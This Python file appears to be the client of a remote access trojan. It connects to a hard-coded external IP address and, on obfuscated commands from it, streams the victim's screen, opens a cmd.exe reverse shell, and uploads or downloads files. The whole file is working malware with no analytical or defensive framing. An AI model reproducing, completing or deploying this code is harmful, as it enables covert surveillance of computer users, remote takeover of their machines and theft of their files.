from mss import mss
from numpy import array
import socket as s
from pickle import dumps
from os import write, read
from threading import Thread
from subprocess import Popen, PIPE, STDOUT

host = '20.90.187.186'
port = 8080
shell_port = 80
Client = s.socket()
Client.connect((host, port))
imageTrigger = True


class Shell:
    def __init__(self):
        self.p = Popen(['cmd.exe'], stdin=PIPE, stdout=PIPE, stderr=STDOUT)
        self.on = True
        Thread(target=self.rcv, daemon=True).start()
        while self.on:
            o = read(self.p.stdout.fileno(), 1024)
            Client.send(o)

    def rcv(self):
        while self.on:
            print(self.on)
            i = Client.recv(1024)
            if i.decode() == "exit":
                Client.send(b'Shell stopped')
                self.on = False
            else:
                write(self.p.stdin.fileno(), i + b'\n')


def sendFrame(f):
    f = dumps(f)
    Client.sendall(f)
    Client.send(b'<sent>!#!<sent>')


def Vid():
    while True:
        with mss() as sct:
            monitor = sct.monitors[1]
            monitor = (monitor['left'], monitor['top'], monitor['width'], monitor['height'])
            sendFrame(array(array(sct.grab(monitor))))
            txt = Client.recv(1024)
            if txt == b'stp.scrnshr.rrn':
                break


def split(size, num):
    result = []
    while size > 0:
        size -= num
        result.append(num)
    result[-1] += size
    return result


def download(filename, size):
    with open(filename, "wb") as wb:
        arr = split(size, 1024)
        for n in arr:
            wb.write(Client.recv(n))
        wb.close()


def upload(filename):
    file = open(filename, 'rb').read()
    Client.send(str(len(file)).encode())
    Client.sendall(file)


if __name__ == '__main__':
    while True:
        text = Client.recv(20)
        if text == b'scrnshr.rrn':
            Vid()
        elif text == b'shll.rrn':
            Shell()
        elif text == b'upld.rrn':
            fn = Client.recv(1024)
            print(fn)
            fn = fn.decode()
            sz = int(Client.recv(1024).decode())
            download(fn, sz)
        elif text == b'dnld.rrn':
            fn = Client.recv(1024).decode()
            try:
                upload(fn)
            except:
                print("error")
        else:
            pass
